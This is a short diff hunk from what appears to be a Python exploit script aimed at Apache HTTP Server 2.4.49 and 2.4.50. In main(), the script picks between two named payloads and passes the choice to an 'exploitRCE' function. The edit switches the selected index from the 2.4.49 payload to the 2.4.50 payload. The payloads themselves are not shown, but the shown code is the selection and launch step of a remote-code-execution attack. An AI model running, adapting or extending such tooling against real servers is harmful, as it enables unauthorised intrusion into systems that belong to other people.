@@ -70,7 +70,7 @@ def main():
         payloads = [apache2449_payload,apache2450_payload]
         choice = len(payloads) + 1
         while choice >= len(payloads) and choice >= 0:
-            choice = 0
+            choice = 1
             if choice < len(payloads):
                 exploitRCE(payloads[choice])
     except KeyboardInterrupt:
